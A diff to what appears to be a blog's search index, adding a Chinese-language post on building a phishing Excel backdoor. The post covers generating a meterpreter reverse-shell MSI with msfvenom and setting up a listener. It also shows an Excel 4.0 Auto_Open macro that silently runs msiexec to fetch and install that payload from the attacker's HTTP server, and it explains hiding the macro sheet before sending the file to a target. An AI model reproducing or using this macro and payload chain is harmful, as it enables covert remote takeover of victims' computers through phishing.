@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>制作excel后门文件</title>
+    <link href="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/"/>
+    <url>/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/</url>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前通过学习研究，制作了world宏病毒文件以此来进行钓鱼上线，但通过制作后门文件的方式还有很多，这篇文章将通过excel方式进行宏病毒文件制作，当前和之前制作world文件一样，并不具备免杀效果，但是也是使用得远程加载，在一定程度上能起到免杀。</p><h2 id="1、首先生成Excel4-0宏后门"><a href="#1、首先生成Excel4-0宏后门" class="headerlink" title="1、首先生成Excel4.0宏后门"></a>1、首先生成Excel4.0宏后门</h2><p>这里我通过kali中的msf进行生成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=监听IP <span class="hljs-attribute">lport</span>=监听端口 -f msi -o shell.msi<br></code></pre></td></tr></table></figure><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/1.png" class=""><h2 id="2、MSF监听会话"><a href="#2、MSF监听会话" class="headerlink" title="2、MSF监听会话"></a>2、MSF监听会话</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost</span>  监听<span class="hljs-comment">IP</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport</span>  监听端口<br>run <span class="hljs-comment">-j</span><br></code></pre></td></tr></table></figure><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/2.png" class=""><h2 id="3、开启一个http服务"><a href="#3、开启一个http服务" class="headerlink" title="3、开启一个http服务"></a>3、开启一个http服务</h2><p>在目标用户打开excell宏文件时，自动从该服务器下载</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/3.png" class=""><h2 id="3、新建excel文件"><a href="#3、新建excel文件" class="headerlink" title="3、新建excel文件"></a>3、新建excel文件</h2><p>在新建的excel文件中，右击sheet1工作表，选择插入</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/4.png" class=""><p>选择Excel4.0宏表，确定</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/5.png" class=""><p>在宏1标签页中：</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">在左上角第一个格子,输入以下内容，调用远程服务器上的shell.msi文件<br>=EXEC(<span class="hljs-string">&quot;msiexec /q /i http://IP/shell.msi&quot;</span>)<br>第二个格子输入以下内容，标识Excel <span class="hljs-number">4.0</span>宏结束<br>=HALT()<br>将左上角的<span class="hljs-symbol">A1</span>模式修改为：Auto_Open，并Enter回车，自动运行宏。<br></code></pre></td></tr></table></figure><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/6.png" class=""><p>为了在对方打开文件时，显示宏1工资表，这里右击将其隐藏即可</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/7.png" class=""><p>另存为.xlsm后缀文件</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/9.png" class=""><h2 id="4、目标上线"><a href="#4、目标上线" class="headerlink" title="4、目标上线"></a>4、目标上线</h2><p>再将此文件发送给对方后，只需要点击启用宏，宏会自动下载远程恶意MSI文件并运行，msf就能看到会话</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/1.png" class=""><p>会话记录</p><img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/10.png" class="">]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>apt/社工</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>从零到一搭建一个真实的钓鱼站点</title>
     <link href="/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/"/>
     <url>/2022/11/06/%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%9C%9F%E5%AE%9E%E7%9A%84%E9%92%93%E9%B1%BC%E7%AB%99%E7%82%B9/</url>
